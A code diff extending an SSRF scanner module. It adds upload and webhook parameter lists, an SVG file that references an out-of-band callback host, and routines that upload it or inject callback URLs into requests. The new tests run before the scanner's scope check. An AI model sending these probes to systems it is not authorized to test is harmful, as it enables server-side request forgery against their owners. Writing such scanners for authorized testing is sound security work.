@@ -40,6 +40,30 @@ SSRF_PARAM_NAMES = [
     "dest", "target", "next", "proxy", "endpoint", "link",
     "image", "img", "src", "load", "fetch", "read", "include",
     "host", "domain", "reference", "callback", "webhook",
+    "avatar", "picture", "photo", "profile_pic", "attachment",
+    "import_url", "export_url", "download_url", "upload_url",
+    "webhook_url", "notification_url", "return_url", "redirect_uri",
+    "image_url", "video_url", "resource_url",
+]
+
+# SSRF vectors beyond metadata endpoints
+SSRF_UPLOAD_ENDPOINTS = [
+    "/upload", "/upload/avatar", "/upload/image", "/upload/photo",
+    "/media/upload", "/api/upload", "/api/v1/upload",
+    "/profile/avatar", "/profile/photo",
+    "/import", "/import/csv", "/import/users",
+]
+
+SSRF_SVG_PAYLOAD = '''<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">
+   <image xlink:href="http://{oob}/ssrf-svg" width="200" height="200"/>
+</svg>'''
+
+# Webhook/notification URLs to test for SSRF
+SSRF_WEBHOOK_PARAMS = [
+    "webhook", "webhook_url", "callback_url", "notification_url",
+    "hook", "endpoint_url", "target_url", "response_url",
 ]
 
 SSRF_METADATA_PAYLOADS = {
@@ -320,12 +344,57 @@ class SSRFScanner(ScannerBase):
                 continue
         return reachable
 
+    # ── SVG / file upload SSRF testing ──────────────────────────────────
+
+    def _test_svg_upload(self, url: str) -> None:
+        """Send an SVG file with an external image reference to test SSRF."""
+        oob_host = self.config.get("oob_host")
+        if not oob_host:
+            return
+        svg_content = SSRF_SVG_PAYLOAD.replace("{oob}", oob_host)
+        files = {"file": ("test.svg", svg_content, "image/svg+xml")}
+        try:
+            resp = safe_post(self.session, url, files=files, timeout=self.timeout)
+            if resp and resp.status_code in (200, 201, 202):
+                log(f"  [SSRF SVG] Upload accepted at {url}", Colors.GREEN,
+                    verbose_only=True, verbose=self.verbose)
+        except Exception:
+            pass
+
+    def _test_webhook_endpoints(self, url: str) -> None:
+        """Test webhook registration endpoints for SSRF by registering
+        a callback URL."""
+        oob_host = self.config.get("oob_host")
+        if not oob_host:
+            return
+        for param in SSRF_WEBHOOK_PARAMS:
+            payload_url = f"http://{oob_host}/ssrf-webhook"
+            test_url = f"{url}?{param}={payload_url}"
+            try:
+                resp = safe_get(self.session, test_url, self.timeout)
+                if resp and resp.status_code == 200:
+                    log(f"  [SSRF Webhook] Payload accepted at {url} via {param}",
+                        Colors.GREEN, verbose_only=True, verbose=self.verbose)
+            except Exception:
+                continue
+
     # ── Scan entry point ────────────────────────────────────────────────
 
     def scan(self, target_urls: list[str] | None = None) -> list[Finding]:
         self._prepare_scan()
         oob_host = self.config.get("oob_host")
         urls = self.recon.get("urls", []) if target_urls is None else target_urls
+
+        # ── Test SVG upload endpoints for SSRF ─────────────────────────
+        for svg_url in SSRF_UPLOAD_ENDPOINTS:
+            full_url = self.base_url.rstrip("/") + svg_url
+            self._test_svg_upload(full_url)
+        # Also check discovered upload endpoints from recon
+        for url in urls:
+            path = urlparse(url).path.lower()
+            if any(up in path for up in ["upload", "import", "avatar", "photo"]):
+                self._test_svg_upload(url)
+                self._test_webhook_endpoints(url)
 
         for url in urls:
             if not self._in_scope(url):
